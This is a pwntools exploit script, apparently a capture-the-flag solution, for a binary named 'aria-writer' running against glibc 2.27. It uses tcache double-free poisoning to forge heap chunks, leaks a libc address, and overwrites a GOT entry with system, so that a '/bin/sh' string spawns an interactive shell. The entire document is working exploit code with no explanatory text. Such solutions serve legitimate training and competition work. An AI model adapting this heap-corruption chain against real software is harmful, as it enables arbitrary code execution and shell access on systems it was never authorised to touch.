from pwn import *
context.log_level = 'debug'

TARGET = './aria-writer'
HOST = ''
PORT = 0

# r = process(TARGET)
r = process(TARGET, env={"LD_PRELOAD":"./libc-2.27.so"})
# r = remote(HOST, PORT)

gdb.attach(r, '''
b*0x400a24
b*0x400a97
d
c
''')
elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))
def create(size, cont):
    r.sendline('1')
    r.sendlineafter('pls >', str(size))
    r.sendlineafter('tho >', cont)
    r.recvuntil('pls >')

def delete(): 
    r.sendline('2')
    r.recvuntil('pls >')

r.sendlineafter('>', p64(0) + p64(0x421))
# r.sendlineafter('>', p64(0x0))
r.recvuntil('pls >')

create(0x38, 'AAAA')
delete()
delete()
create(0x38, p64(0x602500))
create(0x38, p64(0xdeadbeef))
create(0x38, p64(0)+p64(0x21)+p64(0) * 3+ p64(0x21))

create(0x18, 'BBBB')
delete()
delete()
create(0x18, p64(0x6020f0))
create(0x18, 'BBBB')
create(0x18, 'BBBB')
delete()

r.sendline('3')
r.recvuntil(p64(0x421))
libc_leak = u64(r.recv(6).ljust(8, '\x00'))
dbg("libc_leak")
libc_base = libc_leak - 0x3ebca0
dbg("libc_base")
system = libc_base + 0x4f440

create(0x28, 'CCCC')
delete()
delete() 
create(0x28, p64(0x602018))
create(0x28, 'CCCC')
create(0x28, p64(system))

create(0x48, '/bin/sh\x00') 
r.sendline('2')
r.interactive()
